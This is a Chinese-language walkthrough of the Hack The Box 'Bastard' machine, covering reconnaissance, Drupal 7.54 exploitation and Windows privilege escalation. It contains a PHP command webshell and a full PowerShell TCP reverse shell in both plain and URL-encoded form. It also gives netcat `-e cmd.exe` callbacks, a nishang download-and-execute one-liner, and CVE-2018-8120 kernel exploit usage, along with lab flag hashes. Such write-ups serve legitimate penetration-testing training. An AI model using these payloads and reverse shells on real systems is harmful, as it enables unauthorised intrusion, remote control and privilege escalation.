# 一.信息搜集

```````
1.namp port scan output:
	PORT      STATE SERVICE
	80/tcp    open  http
	135/tcp   open  msrpc
	49154/tcp open  unknown
- 135/49154 msrpc: Microsoft Windows RPC

2.nmap detail scan output:
80/tcp    open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to Bastard | Bastard	

```````

## 漏洞信息检索

```
detail scan 中显示目标服务使用Microsoft-IIS/7.5,框架采用的是Drupla 7,并且暴露了目录
```

### IIS/7.5

```
┌──(kali㉿bogon)-[~]
└─$ whatweb http://10.10.10.9
http://10.10.10.9 [200 OK] Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Microsoft-IIS/7.5], IP[10.10.10.9], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], Microsoft-IIS[7.5], PHP[5.3.28,], PasswordField[pass], Script[text/javascript], Title[Welcome to Bastard | Bastard], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.3.28, ASP.NET]

searchsploit iis 7.5 
- Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities
漏洞介绍，在路径后加:$i30:$INDEX_ALLOCATION
例如:http://<victimIIS75>/admin:$i30:$INDEX_ALLOCATION/admin.php,可以将后面路径的内容将php代码解析，但是对我们现在阶段没有太大用处
```

### Drupal

```
searchsploit drupal 7,有漏洞的版本有很多，所以我们看看能不能搜集到具体的版本
之前的detail scan 中有暴露的路径，先访问robots.txt
有allow和disallow的目录
在/CHANGELOG.txt中显示Drupal 7.54, 2017-02-01

发现Drupal 7.x Module Services - Remote Code Execution感觉可能性较大
另外还展示了Drupalgeddon2/3
AI说明是什么意思:2/3是相继2018/3-4月份出现的两个drupal严重安全漏洞可以进行RCE
之前的log中显示我们的更新版本是在2017-02-01,学习目的可以尝试利用

searchsploit drupal 7.54 -m 41
漏洞利用分为三个阶段:
	1.用sql注入获取当前端点(endpoint)的缓存内容管理员凭据
	2.修改缓存内容，让我们可以写入文件
	3.恢复缓存内容

(初始化)Initialization:
我们需要修改	- 目标url
			- endpoint_path
			- filename 以及 我们的webshell
现在的目标就是不知道endpoint是什么，尝试目录爆破
```

## 目录爆破

```
1.sudo gobuster dir -u http://10.10.10.9 -w /usr/share/wordlists/dirbuster/... -o file_output

2.sudo dirsearch -u http://10.10.10.9

3.sudo dirb -u http://10.10.10.9

4.feroxbuster -u http://10.10.10.9 -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints-res.txt  -t 64
因为是爆破端点，在seclists里面找到了包含端点的字典

只能本次目录爆破非常慢，而且由于网络不稳定，扫的时候可能丢失了，导致全是报错
最终发现http://10.10.10.9/rest：
Services Endpoint "rest_endpoint" has been setup successfully.

```

# Windows渗透

## 反弹shell

```
修改payload
$url = 'http://10.10.10.9';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$file = [
    'filename' => 'Cr4ck_c411.php',
    'data' => '<?php system($_REQUEST['cmd']); ?>'
];

php 41564.php

curl -s http:/10.10.10.9/Cr4ck_c411.php?cmd=whoami
成功执行

执行我们的powershell看看能不能成功
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.26',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

powershell%20-nop%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.10.16.26%27%2C4444%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22

user.txt:85dc8f1d813a7bd97f520c8eacd72acb
```

### 提权

```
systeminfo:
Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-402-3582622-84461
Original Install Date:     18/3/2017, 7:04:46 ??
System Boot Time:          29/6/2024, 11:49:01 ??
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2.047 MB
Available Physical Memory: 1.500 MB
Virtual Memory: Max Size:  4.095 MB
Virtual Memory: Available: 3.514 MB
Virtual Memory: In Use:    581 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.9
Hotfix没有打过补丁，可以尝试windows内核漏洞的提权

在当前目录开启一个samba共享
sudo python /usr/share/doc/python3-impacket/examples/smbserver.py share .
开启一个网络目录
sudo python3 -m http.server 4445
此目录传入nc


git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester
python2 -m pip install --user xlrd==1.1.0
python2 windows-exploit-suggester.py --update

┌──(kali㉿bogon)-[~/redteam/bastard]
└─$ python2 windows-exploit-suggester.py --database 2024-06-29-mssb.xls  --systeminfo windows
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done

使用/CVE-2018-8120/x64.exe

PS C:\inetpub\drupal-7.54> //10.10.16.26/share/x64.exe "whoami"
CVE-2018-8120 exploit by @unamer(https://github.com/unamer)
[+] Get manager at fffff900c1c954e0,worker at fffff900c1c69060
[+] Triggering vulnerability...
[+] Overwriting...fffff8000183fc38
[+] Elevating privilege...
[+] Cleaning up...
[+] Trying to execute whoami as SYSTEM...
[+] Process created with pid 2952!
nt authority\system

看到已经是system权限了，接下来写反弹shell即可

//10.10.16.26/share/x64.exe "//10.10.16.26/share/nc64.exe -e cmd.exe 10.10.16.26 4446"
root.txt:e95458a54de19e7f8049eae775e4af7e

```

## 补充

### Drupalgeddon2



```
searchsploit Drupal 7.54 
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                                                                                                                                                                      | php/webapps/44449.rb


运行发现缺失组件:gem install highline
ruby 44449.rb http://10.10.10.9
但是shell的交互性不是很好

下载nishang 的github库
shells/Invoke-ShellTcp.ps1 在其中写入反弹shell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.4 -Port 443

kali: sudo nc -lvnp 443
kali: sudo php -S 0:80

windows(low):
powershell iex(new-object system.net.webclient).downloadstring('http://10.10.16.4/Invoke-PowerShellTcp.ps1')
下载到内存中运行

得到反弹shell

```

### Drupalgeddon3

```
在github找利用文件，根据指示操作，其中利用了会话劫持以登录
在浏览器(firefox)中利用session cookie manager插件
```

